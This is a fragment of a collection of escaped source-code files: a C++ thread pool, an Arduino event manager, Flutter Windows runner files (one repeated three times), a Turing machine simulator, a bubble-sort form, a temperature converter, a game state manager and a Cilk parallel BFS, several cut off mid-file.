//cached\u6a21\u5f0f\u4e0b\uff0c\u6709\u53ef\u80fd\u5df2\u7ecf\u521b\u5efa\u4e86\u5f88\u591a\u7ebf\u7a0b\uff0c\u4f46\u662f\u7a7a\u95f2\u65f6\u95f4\u8d85\u8fc760s\uff0c\u5e94\u8be5\u628a\u591a\u4f59\u7684\u7ebf\u7a0b\n            //\u7ed3\u675f\u56de\u6536\u6389\uff08\u8d85\u8fc7initThreadSize_\u6570\u91cf\u7684\u7ebf\u7a0b\u8981\u8fdb\u884c\u56de\u6536\uff09\n            while (Taskque.size() == 0) {\n                if (mode_ == PoolMode::MODE_CACHED) {\n                    if (std::cv_status::timeout ==\n                        notEmpty.wait_for(lock, std::chrono::seconds(1)))//\u6761\u4ef6\u53d8\u91cf\u8d85\u65f6\u8bbf\u95ee\n                    {\n                        auto now = std::chrono::high_resolution_clock().now();\n                        auto dur = std::chrono::duration_cast<std::chrono::seconds>(now - lastTime);\n                        if (dur.count() >= THREAD_MAX_IDLE_TIME\n                            && curThreadSize_ > initThreadSize_) {\n                            //\u5f00\u59cb\u56de\u6536\u7ebf\u7a0b\n                            _threads.erase(threadid); //std::this_thread::getid();\n                            curThreadSize_--;\n                            idleThreadSize_--;\n                            std::cout << \"threadid:\" << std::this_thread::get_id() << \"exit()\";\n                            return;\n                        }\n        ",
    "/*\n * EventManager.cpp\n *\n\n * An event handling system for Arduino.\n *\n * Author: igormt@alumni.caltech.edu\n * Copyright (c) 2013 Igor Mikolic-Torreira\n *\n * Inspired by and adapted from the\n * Arduino Event System library by\n * Author: mromani@ottotecnica.com\n * Copyright (c) 2010 OTTOTECNICA Italy\n *\n * This library is free software; you can redistribute it\n * and/or modify it under the terms of the GNU Lesser\n * General Public License as published by the Free Software\n * Foundation; either version 2.1 of the License, or (at\n * your option) any later version.\n *\n * This library is distributed in the hope that it will\n * be useful, but WITHOUT ANY WARRANTY; without even the\n * implied warranty of MERCHANTABILITY or FITNESS FOR A\n * PARTICULAR PURPOSE.  See the GNU Lesser General Public\n * License for more details.\n *\n * You should have received a copy of the GNU Lesser\n * General Public License along with this library; if not,\n * write to the Free Software Foundation, Inc.,\n * 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA\n *\n */\n\n\n#include \"EventManager.h\"\n\nnamespace\n{\n    // This class takes care of turning interrupts on and off.\n    // There is a different implementation of this class for each architecture that\n    // has a different interrupt model.  #if macros ensure only one version is defined.\n\n#if defined( __AVR_ARCH__ )\n\n    class SuppressInterrupts\n    {\n    public:\n\n        // Record the current state and suppress interrupts when the object is instantiated.\n        SuppressInterrupts()\n        {\n            mInterruptsWereOn = (SREG & (1<<SREG_I));\n            cli();\n        }\n\n        // Restore whatever interrupt state was active before\n        ~SuppressInterrupts()\n        {\n            // Turn on global interrupts, only if they were already on\n            if ( mInterruptsWereOn )\n            {\n                sei();\n            }\n        }\n\n    private:\n\n        uint8_t     mInterruptsWereOn;\n    };\n\n#elif defined( SAM ) || defined( ARDUINO_ARCH_SAMD )\n\n    class SuppressInterrupts\n    {\n    public:\n\n        // Record the current state and suppress interrupts when the object is instantiated.\n        SuppressInterrupts()\n        {\n            mInterruptsWereOn = (__get_PRIMASK() == 0);\n            __disable_irq();\n        }\n\n        // Restore whatever interrupt state was active before\n        ~SuppressInterrupts()\n        {\n            // Turn on interrupts, only if they were already on\n            if ( mInterruptsWereOn )\n            {\n                __enable_irq();\n            }\n        }\n\n    private:\n\n        uint8_t     mInterruptsWereOn;\n    };\n\n#elif defined( ESP8266 )\n\n    class SuppressInterrupts\n    {\n    public:\n\n        // Record the current state and suppress interrupts when the object is instantiated.\n        SuppressInterrupts()\n        {\n            // This turns off interrupts and gets the old state in one function call\n            // See https://github.com/esp8266/Arduino/issues/615 for details\n            // level 15 will disable ALL interrupts,\n            // level 0 will enable ALL interrupts\n            mSavedInterruptState = xt_rsil( 15 );\n        }\n\n        // Restore whatever interrupt state was active before\n        ~SuppressInterrupts()\n        {\n            // Restore the old interrupt state\n            xt_wsr_ps( mSavedInterruptState );\n        }\n\n    private:\n\n        uint32_t    mSavedInterruptState;\n    };\n\n#elif defined( CORE_TEENSY )\n    \n    class SuppressInterrupts\n    {\n    public:\n        \n        //Reference: https://www.pjrc.com/teensy/interrupts.html\n        //Backup the interrupt enable state and restore it\n        SuppressInterrupts() \n        {\n            mSregBackup = SREG;     /* save interrupt enable/disable state */\n            cli();                  /* disable the global interrupt */\n        }\n        \n        ~SuppressInterrupts() \n        {\n            SREG = mSregBackup;     /* restore interrupt state */\n        }\n        \n    private:\n        \n        uint8_t mSregBackup;\n    };\n    \n#elif defined( ESP32 )\n    \n    #include <freertos/portmacro.h>\n\n    class SuppressInterrupts\n    {\n    public:\n        \n        // Reference: https://docs.espressif.com/projects/esp-idf/en/latest/esp32/api-guides/freertos-smp.html#critical-sections-disabling-interrupts\n        // Enter critical section\n        SuppressInterrupts()\n        {\n            portENTER_CRITICAL(&gMux);\n        }\n        \n        // Exit critical section\n        ~SuppressInterrupts()\n        {\n            portEXIT_CRITICAL(&gMux);\n        }\n\n        static portMUX_TYPE gMux;\n    };\n    \n    // gMux is globally accessible as a public static member variable\n    portMUX_TYPE SuppressInterrupts::gMux = portMUX_INITIALIZER_UNLOCKED;\n\n#else\n\n#error \"Unknown microcontroller:  Need to implement class SuppressInterrupts for this microcontroller.\"\n\n#endif\n\n}\n\n\n\n\n#if EVENTMANAGER_DEBUG\n#define EVTMGR_DEBUG_PRINT( x )\t\tSerial.print( x );\n#define EVTMGR_DEBUG_PRINTLN( x )\tSerial.printl",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <cstring>\n#include <sstream>\n#include <vector>\n#include <map>\n\n#include <toolFunction.h>\n\nusing namespace std;\n\nstruct Transition{\n    string oldStates;\n    string oldSymbols;\n    string newSymbols;\n    string directions;\n    string newStates;\n};\n\nbool verbose = false;\nvector<string> Q;\nvector<string> S;\nvector<string> G;\nstring q0;\nstring B;\nvector<string> F;\nint N;\nvector<Transition> delta;\n\nvoid parse(char *turingFile);\n\nvoid simulate(char *input);\n\nint main(int argc, char *argv[])\n{\n    //-h\u5728\u547d\u4ee4\u884c\u53c2\u6570\u91cc\u4f18\u5148\u7ea7\u6bd4\u8f83\u9ad8\uff0c\u53ea\u8981\u547d\u4ee4\u4e2d\u6709-h\uff0c\u81ea\u52a8\u8fdb\u5165\u624b\u518c\u9875\u9762\n    for (int i = 1; i < argc; i++)\n    {\n        if (strcmp(argv[i], \"-h\") == 0 || strcmp(argv[i], \"--help\") == 0)\n        {\n            cout << \"usage: turing [-v|--verbose] [-h|--help] <tm> <input>\" << endl;\n            exit(0);\n        }\n    }\n    char *turingFile = NULL;\n    char *input = NULL;\n    for (int i = 1; i < argc; i++)\n        if (strcmp(argv[i], \"-v\") == 0 || strcmp(argv[i], \"--verbose\") == 0)\n            verbose = true;\n    // \u7a0b\u5e8f\u4f20\u5165\u53c2\u6570\u6709\u8bef\n    if ((verbose && argc != 4) || (!verbose && argc != 3))\n    {\n        cerr << \"syntax error\" << endl\n            << \"usage: turing [-v|--verbose] [-h|--help] <tm> <input>\" << endl;\n        exit(1);\n    }\n\n    input = argv[argc - 1];\n    if ((string(argv[argc - 2])).length() < 3 || ((string(argv[argc - 2])).substr(string(argv[argc - 2]).length() - 3) != \".tm\"))\n    {\n        cerr << \"syntax error\" << endl\n            << \"usage: turing [-v|--verbose] [-h|--help] <tm> <input>\" << endl;\n        exit(1);\n    }\n    else\n        turingFile = argv[argc - 2];\n\n    parse(turingFile);\n    simulate(input);\n}\n\nvoid parse(char *turingFile){\n    ifstream file(turingFile);\n    if(file.is_open()){\n        int i = 0;\n        string line;\n        while(getline(file, line)){\n            line = formatLine(line);\n            if(line == \"\")\n                continue;\n            else if(startwith(line, \";\"))\n                continue;\n            else if(i == 0){\n                i++;\n\n                //\u68c0\u67e5\u72b6\u6001\u96c6Q\u7684\u8bed\u6cd5\n                if(!startwith(line, \"#Q = {\") || line.at(line.length() - 1) != '}'){\n                    cerr << \"syntax error\" << endl;\n                    if (verbose)\n                        cerr << \"Q: Turing machine program syntax\" << endl;\n                    exit(1);\n                }\n\n                if(checkBraceNum(line)){\n                    string Qstr = line.substr(line.find(\"{\"));\n                    Q = splitString(Qstr, \"{,}\");\n                    if(!checkStates(Q)){\n                        cerr << \"syntax error\" << endl;\n                        if (verbose)\n                            cerr << \"Q: The state set is illegal.\" << endl;\n                        exit(1);\n                    }\n                }\n                else{\n                    cerr << \"syntax error\" << endl;\n                    if (verbose)\n                        cerr << \"Q: Turing machine program syntax\" << endl;\n                    exit(1);\n                }\n            }\n            else if(i == 1){\n                i++;\n\n                //\u68c0\u67e5\u8f93\u5165\u7b26\u53f7\u96c6\u5408S\u7684\u8bed\u6cd5\n                if(!startwith(line, \"#S = {\") || line.at(line.length() - 1) != '}'){\n                    cerr << \"syntax error\" << endl;\n                    if (verbose)\n                        cerr << \"S: Turing machine program syntax\" << endl;\n                    exit(1);\n                }\n\n                if(checkBraceNum(line)){\n                    string Sstr = line.substr(line.find(\"{\"));\n                    S = splitString(Sstr, \"{,}\");\n                    if(!checkSymbols(S, \" ,;{}*_\")){\n                        cerr << \"syntax error\" << endl;\n                        if (verbose)\n                            cerr << \"S: The label character set is illegal.\" << endl;\n                        exit(1);\n                    }\n                }\n                else{\n                    cerr << \"syntax error\" << endl;\n                    if (verbose)\n                        cerr << \"S: Turing machine program syntax\" << endl;\n                    exit(1);\n                }\n            }\n            else if(i == 2){\n                i++;\n\n                //\u68c0\u67e5\u7eb8\u5e26\u7b26\u53f7\u96c6G\u7684\u8bed\u6cd5\n                if(!startwith(line, \"#G = {\") || line.at(line.length() - 1) != '}'){\n                    cerr << \"syntax error\" << endl;\n                    if (verbose)\n                        cerr << \"G: Turing machine program syntax\" << endl;\n                    exit(1);\n                }\n\n                if(checkBraceNum(line)){\n                    string Gstr = line.substr(line.find(\"{\"));\n                    G = splitString(Gstr, \"{,}\");\n                    if(!checkSymbols(G, \" ,;{}*\")){\n                        cerr << \"syntax error\" << endl;\n                        if (verbose)\n                            cerr << \"G: The label character set is illegal.\" << endl;\n                        exit(1);\n                    }\n                }\n                else{\n                    cerr << \"syntax error\" << end",
    "from ._anvil_designer import Form1Template\nfrom anvil import *\n\nclass Form1(Form1Template):\n    def __init__(self, **properties):\n        # Set Form properties and Data Bindings.\n        self.init_components(**properties)\n\n        # Any code you write here will run before the form opens.\n\n    def bubble_sort(self, arr):\n        n = len(arr)\n        for i in range(n-1):\n            for j in range(0, n-i-1):\n                if arr[j] > arr[j+1]:\n                    arr[j], arr[j+1] = arr[j+1], arr[j]\n\n    def update_sorted_array(self):\n        input_string = self.text_box_1.text # L\u1ea5y d\u1eef li\u1ec7u t\u1eeb text_box_1\n        input_list = [int(x) for x in input_string.split()] # Chuy\u1ec3n \u0111\u1ed5i d\u1eef li\u1ec7u nh\u1eadp v\u00e0o th\u00e0nh list c\u00e1c s\u1ed1 nguy\u00ean\n\n        self.bubble_sort(input_list) # S\u1eafp x\u1ebfp m\u1ea3ng\n\n        # Hi\u1ec3n th\u1ecb k\u1ebft qu\u1ea3 \u0111\u00e3 s\u1eafp x\u1ebfp v\u00e0o text_box_2\n        output_string = \" \".join(map(str, input_list))\n        self.text_box_2.text = output_string\n\n    def text_box_1_pressed_enter(self, **event_args):\n        \"\"\"This method is called when the user presses Enter in this text box\"\"\"\n        self.update_sorted_array()\n",
    "\ufeff#include <iostream>\n\nint main()\n{\n    int islem;\n    float derece;\n    float sonuc;\n    std::cout << \"************************************\\n\";\n    std::cout << \"Yapilacak islemi secin.\\n\";\n    std::cout << \"************************************\\n\";\n    std::cout << \"1. Celsius to Fahrenheit\\n\";\n    std::cout << \"2. Celsius to Kelvin\\n\";\n    std::cout << \"3. Fahrenheit to Celsius\\n\";\n    std::cout << \"4. Fahrenheit to Kelvin\\n\";\n    std::cout << \"5. Kelvin to Celsius\\n\";\n    std::cout << \"6. Kelvin to Fahrenheit\\n\";\n    std::cout << \"************************************\\n\";\n    std::cout << \"Islem:\";\n    std::cin >> islem;\n    std::cout << \"************************************\\n\";\n    std::cout << \"Havanin kac derece oldugunu girin:\";\n    std::cin >> derece;\n\n    if (islem == 1) {\n        sonuc = (derece * 9 / 5) + 32;\n        std::cout << derece <<\"\u00b0C \" << sonuc<< \"\u00b0F degerine esittir.\";\n    }\n    else if (islem == 2) {\n        sonuc = derece + 273.15;\n        std::cout << derece <<  \"\u00b0C \" << sonuc << \"K degerine esittir.\";\n    }\n    else if (islem == 3) {\n        sonuc = (derece - 32) * 5 / 9;\n        std::cout << derece << \"\u00b0F \" << sonuc << \"\u00b0C degerine esittir.\";\n    }\n    else if (islem == 4) {\n        sonuc = (derece - 32) * 5 / 9 + 273.15;\n        std::cout << derece << \"\u00b0F \" << sonuc << \"K degerine esittir.\";\n    }\n    else if (islem == 5) {\n        sonuc = derece - 273.15;\n        std::cout << derece << \"K \" << sonuc << \"\u00b0C degerine esittir.\";\n    }\n    else if (islem == 6) {\n        sonuc = (derece - 273.15) * 9 / 5 + 32;\n        std::cout << derece << \"K \" << sonuc << \"\u00b0F degerine esittir.\";\n    }\n    else {\n        std::cout << \"Hatal\u0131 i\u015flem yapt\u0131n\u0131z.\";\n    }\n\n}\n\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"game_state_manager.hpp\"\n\nnamespace core \n{\n\tvoid GameStateManager::GSInitialise(double framerate, GameState& initial_state)\n\t{\n\t\tp_framerate = framerate;\n\t\tp_fixed_time_step = 1.0f / framerate;\n\t\tp_current_status = p_previous_status = p_next_status = GameStateStatus::STATE_DEFAULT;\n\t\tp_current = p_next = &initial_state;\n\t}\n\n\tvoid GameStateManager::GSSetNextState(GameState& next_state)\n\t{\n\t\tp_next_status = GameStateStatus::STATE_CHANGE;\n\t\tp_next = &next_state;\n\t}\n\n\tvoid GameStateManager::GSRun(void)\n\t{\t\n\t\twhile (p_current_status != GameStateStatus::STATE_QUIT)\n\t\t{\n\t\t\tif (p_current_status == GameStateStatus::STATE_RESTART)\n\t\t\t{\n\t\t\t\tp_current_status = p_previous_status;\n\t\t\t\tp_next_status = p_previous_status;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tp_current = p_next;\n\t\t\t\tp_current->Load();\n\t\t\t}\n\n\t\t\tp_next_status = GameStateStatus::STATE_DEFAULT;\n\t\t\tp_current->Initialise();\n\n\t\t\tp_total_time_in_game_state = 0;\n\t\t\tdouble current_time = GetCurrentTimeViaChrono();\n\t\t\tdouble accumulator = 0;\n\n\t\t\twhile (p_next_status == GameStateStatus::STATE_DEFAULT)\n\t\t\t{\n\t\t\t\tdouble new_time = GetCurrentTimeViaChrono();\n\t\t\t\tp_delta_time = new_time - current_time;\n\t\t\t\tcurrent_time = new_time;\n\n\t\t\t\tInputHandler::GetInstance().Update();\n\t\t\t\tp_current->Update();\n\t\t\t\tp_current->Draw();\n\n\t\t\t\tdo\n\t\t\t\t{\n\t\t\t\t\tnew_time = GetCurrentTimeViaChrono();\n\t\t\t\t\tp_delta_time = new_time - current_time;\n\n\t\t\t\t} while (p_delta_time < p_fixed_time_step);\n\n\t\t\t\taccumulator += p_delta_time;\n\n\t\t\t\twhile (accumulator >= p_fixed_time_step)\n\t\t\t\t{\n\t\t\t\t\tp_current->FixedUpdate();\n\t\t\t\t\taccumulator -= p_fixed_time_step;\n\t\t\t\t}\n\n\t\t\t\tp_total_time_in_game_state += p_delta_time;\n\t\t\t\tp_total_time += p_delta_time;\n\t\t\t}\n\n\t\t\tp_current->Free();\n\n\t\t\tif (p_next_status != GameStateStatus::STATE_RESTART)\n\t\t\t{\n\t\t\t\tp_current->Unload();\n\t\t\t}\n\n\t\t\tp_previous_status = p_current_status;\n\t\t\tp_current_status = p_next_status;\n\t\t}\n\t}\n\n\tvoid GameStateManager::GSRestart(void)\n\t{\n\t\tp_next_status = GameStateStatus::STATE_RESTART;\n\t}\n\n\tvoid GameStateManager::GSQuit(void)\n\t{\n\t\tp_next_status = GameStateStatus::STATE_QUIT;\n\t}\n\n\tdouble GameStateManager::GetFramerate(void)\n\t{\n\t\treturn p_framerate;\n\t}\n\n\tdouble GameStateManager::GetTime(void)\n\t{\n\t\treturn p_total_time;\n\t}\n\n\tdouble GameStateManager::GetGameStateTime(void)\n\t{\n\t\treturn p_total_time_in_game_state;\n\t}\n\n\tdouble GameStateManager::GetDeltaTime(void)\n\t{\n\t\treturn p_delta_time;\n\t}\n\n\tdouble GameStateManager::GetFixedDeltaTime(void)\n\t{\n\t\treturn p_fixed_time_step;\n\t}\n\n\tdouble GameStateManager::GetCurrentTimeViaChrono(void)\n\t{\n\t\treturn std::chrono::duration<double>(std::chrono::steady_clock::now().time_since_epoch()).count();\n\t}\n}",
    "#include <iostream>\n#include <algorithm>\n#include \"cilk/cilk.h\"\n#include <ctime>\n#include <chrono>\n#include <queue>\n\n//#define int long long\n\nusing namespace std;\n\n//const int BLOCK = 32;\n\n//void p_for(int times, int counter, void (*f)()) {\nvoid p_for(int times, int counter, function<void(void)> f) {\n    if (times < 2) {\n        f();\n        return;\n    }\n    int times1 = times / 2;\n    cilk_scope {\n            cilk_spawn p_for(times1, counter, f);\n            p_for(times - times1, counter + times1, f);\n    };\n}\n\n//void p_for(int times, int counter, void (*f)(int i)) {\nvoid p_for(int times, int counter, function<void(int)> f) {\n    if (times < 2) {\n        f(counter);\n        return;\n    }\n    int times1 = times / 2;\n    cilk_scope {\n            cilk_spawn p_for(times1, counter, f);\n            p_for(times - times1, counter + times1, f);\n    };\n}\n\n\n//vector<int> scan(int* l, int* r) {\n//    int p = 1;\n//    int deg = 0;\n//    while (p < r - l) {\n//        deg++;\n//        p *= 2;\n//    }\n////    int* arr = new int[p];\n//    vector<int> arr = vector<int>(p, 0);\n//    memcpy(arr.data(), l, (r - l) * sizeof(int));\n//    for (int i = 2; i <= p; i *= 2) {\n//        p_for(p / i, 0, [&](int j) {\n//            arr[j*i+i-1] = arr[j*i+i/2-1] + arr[j*i+i-1];\n//        });\n//    }\n//    arr[p-1] = 0;\n//    for (int i = p; i > 1; i /= 2) {\n//        p_for(p / i, 0, [&](int j) {\n//            int sum = arr[j*i+i-1] + arr[j*i+i/2-1];\n//            arr[j*i+i/2-1] = arr[j*i+i-1];\n//            arr[j*i+i-1] = sum;\n//        });\n//    }\n//    return arr;\n//}\n\nvoid in_place_scan(int* l, int* r) {\n    int p = 1;\n    int deg = 0;\n    while (p < r - l) {\n        deg++;\n        p *= 2;\n    }\n//    int* arr = new int[p];\n    vector<int> arr = vector<int>(p, 0);\n    memcpy(arr.data(), l, (r - l) * sizeof(int));\n    for (int i = 2; i <= p; i *= 2) {\n        p_for(p / i, 0, [&](int j) {\n            arr[j*i+i-1] = arr[j*i+i/2-1] + arr[j*i+i-1];\n        });\n    }\n    arr[p-1] = 0;\n    for (int i = p; i > 1; i /= 2) {\n        p_for(p / i, 0, [&](int j) {\n            int sum = arr[j*i+i-1] + arr[j*i+i/2-1];\n            arr[j*i+i/2-1] = arr[j*i+i-1];\n            arr[j*i+i-1] = sum;\n        });\n    }\n    memcpy(l, arr.data(), (r - l) * sizeof(int));\n}\n\nvector<int> filter(vector<int> src, function<bool(int)> f) {\n    vector<int> result = vector<int>();\n    for (int i : src) {\n        if (f(i))\n            result.push_back(i);\n    }\n    return result;\n}\n\nvector<int> a;\n\nvoid par_bfs(vector<vector<int>> gr) {\n    a = vector<int>(gr.size(), -1);\n    vector<vector<int>> f = vector<vector<int>>(gr.size(), vector<int>());\n    f[0] = vector<int>(1, 0);\n    a[0] = 0;\n    for (int i = 0; i < gr.size() && !f[i].empty(); i++) {\n        vector<int> deg = vector<int>(f[i].size(), 0);\n//        p_for(f[i]->size(), 0, [&](int j) {\n//            deg[j] = gr[(*f[i])[j]].size();\n//        });\n        for(int j = 0; j < f[i].size(); j++) {\n            deg[j] = gr[f[i][j]].size();\n        }\n        in_place_scan(deg.data(), deg.data() + deg.size());\n        f[i+1] = vector<int>(deg[f[i].size()-1] + gr[f[i][f[i].size()-1]].size(), -1);\n        p_for(f[i].size(), 0, [&](int j) {\n            for (int vi = 0; vi < gr[f[i][j]].size(); vi++) {\n                int v = gr[f[i][j]][vi];\n//                if (i == 0) {\n//                    cout << v << \"\\n\";\n//                }\n                if (a[v] == -1) {\n                    a[v] = i+1;\n                    f[i+1][deg[j]+vi] = v;\n                }\n            }\n        });\n        f[i+1] = filter(f[i+1], [](int x) { return x >= 0; });\n//        if (i == 8) {\n//            for (int j = 0; j < f[i+1].size(); j++)\n//                cout << f[i+1][j] << \" \";\n//            cout << \"\\n\";\n//        }\n    }\n//    return a;\n}\n\nvoid bfs(vector<vector<int>> gr) {\n    a = vector<int>(gr.size(), -1);\n    queue<int> q = queue<int>();\n    q.push(0);\n    for (int i = 0; !q.empty(); i++) {\n        int v = q.front();\n        q.pop();\n        for (int u : gr[v]) {\n            if (a[u] == -1) {\n                a[u] = i;\n                q.push(u);\n            }\n        }\n    }\n}\n\nsigned main() {\n//    p_for(4, 0, []() { cout << \"10 \"; });\n    p_for(4, 0, [](int a) { cout << a << \" \"; });\n    cout << \"\\n\";\n\n    vector<int> arr = {1, 2, 3, 4, 5, 6, 7, 8};\n    in_place_scan(arr.data(), arr.data() + arr.size());\n    for (int i = 0; i < arr.size(); i++)\n        cout << arr[i] << \" \";\n    cout << \"\\n\\n\";\n\n    int n = 300;\n    int n2 = n * n;\n    int n3 = n * n * n;\n    vector<vector<int>> gr = vector<vector<int>>(n3, vector<int>());\n    for (int i = 0; i < n; i++) {\n        for (int j = 0; j < n; j++) {\n            for (int k = 0; k < n; k++) {\n                if (i > 0) gr[i*n2 + j*n + k].push_back((i-1)*n2 + j*n + k);\n                if (i < n-1) gr[i*n2 + j*n + k].push_back((i+1)*n2 + j*n + k);\n                if (j > 0) gr[i*n2 + j*n + k].push_back(i*n2 + (j-1)*n + k);\n                if (j < n-1) gr[i*n2 + j*n + k].push_back(i*n2 + (j+1",
